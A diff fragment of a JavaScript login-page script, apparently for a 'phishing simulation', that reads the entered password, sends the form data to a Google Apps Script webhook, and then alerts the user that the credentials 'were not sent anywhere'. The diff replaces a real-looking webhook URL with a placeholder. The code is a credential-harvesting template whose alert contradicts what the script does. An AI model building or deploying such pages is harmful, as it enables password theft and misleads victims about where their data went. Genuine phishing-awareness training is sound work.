@@ -21,7 +21,7 @@ const password = document.getElementById('password').value;
 
 // --- THIS IS THE IMPORTANT PART ---
 // Paste your Web App URL inside the quotes below.
-const webhookUrl = 'https://script.google.com/macros/s/AKfycbyXOLDwkcGTwAUbDTKPYCnQjUY6Svjs9kF2oqOlKgpc94XN1OSuecgQnmEdJ9cK-bCB/exec';
+const webhookUrl = 'PASTE_YOUR_WEB_APP_URL_HERE';
 
 // Prepare the data to be sent
 const data = {
@@ -51,4 +51,3 @@ alert('This was a phishing simulation. Your credentials were not sent anywhere.'
 });
 });
 });
-
